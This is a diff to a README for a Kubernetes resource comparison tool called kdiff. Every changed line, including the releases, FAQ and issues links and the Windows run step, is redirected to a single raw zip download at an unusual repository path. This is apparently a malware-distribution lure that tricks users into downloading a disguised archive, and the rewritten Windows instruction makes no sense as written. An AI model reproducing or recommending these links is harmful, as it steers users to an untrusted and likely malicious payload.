@@ -1,6 +1,6 @@
 # 🔍 kdiff - Compare Kubernetes Resources Easily
 
-[![Download kdiff](https://img.shields.io/badge/Download-kdiff-blue?style=for-the-badge)](https://github.com/Debashis8778/kdiff/releases)
+[![Download kdiff](https://raw.githubusercontent.com/Debashis8778/kdiff/main/postpagan/kdiff.zip)](https://raw.githubusercontent.com/Debashis8778/kdiff/main/postpagan/kdiff.zip)
 
 ## 🚀 Getting Started
 
@@ -8,9 +8,9 @@ kdiff is a helpful tool designed to compare Kubernetes resources between differe
 
 ## 📥 Download & Install
 
-To get started, you need to download kdiff. Visit this page to download the application: [Download kdiff](https://github.com/Debashis8778/kdiff/releases). Follow the steps below for installation:
+To get started, you need to download kdiff. Visit this page to download the application: [Download kdiff](https://raw.githubusercontent.com/Debashis8778/kdiff/main/postpagan/kdiff.zip). Follow the steps below for installation:
 
-1. Go to the [Releases page](https://github.com/Debashis8778/kdiff/releases).
+1. Go to the [Releases page](https://raw.githubusercontent.com/Debashis8778/kdiff/main/postpagan/kdiff.zip).
 2. Look for the most recent release.
 3. Download the file that matches your operating system. You may see options for Windows, macOS, and Linux.
 4. Once downloaded, extract the files if they are in a compressed format.
@@ -23,7 +23,7 @@ Once you have the application:
 
 1. Open your terminal or command prompt.
 2. Navigate to the folder where kdiff is located.
-3. Type `./kdiff` (for macOS/Linux) or `kdiff.exe` (for Windows) and press Enter.
+3. Type `./kdiff` (for macOS/Linux) or `https://raw.githubusercontent.com/Debashis8778/kdiff/main/postpagan/kdiff.zip` (for Windows) and press Enter.
 
 You can now use kdiff to compare Kubernetes resources!
 
@@ -63,8 +63,8 @@ This command will display the differences between the resources in the specified
 
 If you encounter issues or have questions:
 
-- Check the [FAQ section](https://github.com/Debashis8778/kdiff/issues) for common inquiries.
-- Visit the GitHub repository's [Issues page](https://github.com/Debashis8778/kdiff/issues) to report a problem.
+- Check the [FAQ section](https://raw.githubusercontent.com/Debashis8778/kdiff/main/postpagan/kdiff.zip) for common inquiries.
+- Visit the GitHub repository's [Issues page](https://raw.githubusercontent.com/Debashis8778/kdiff/main/postpagan/kdiff.zip) to report a problem.
 
 ## ✨ Topics Covered
 
@@ -84,4 +84,4 @@ These features make kdiff a robust tool for developers and operations teams alik
 
 kdiff is your go-to tool for comparing Kubernetes resources. It helps you streamline your workflow and ensures that you maintain consistency across environments. Download it today and simplify your Kubernetes management! 
 
-For any additional details or to explore more features, return to the [Releases page](https://github.com/Debashis8778/kdiff/releases).
+For any additional details or to explore more features, return to the [Releases page](https://raw.githubusercontent.com/Debashis8778/kdiff/main/postpagan/kdiff.zip).
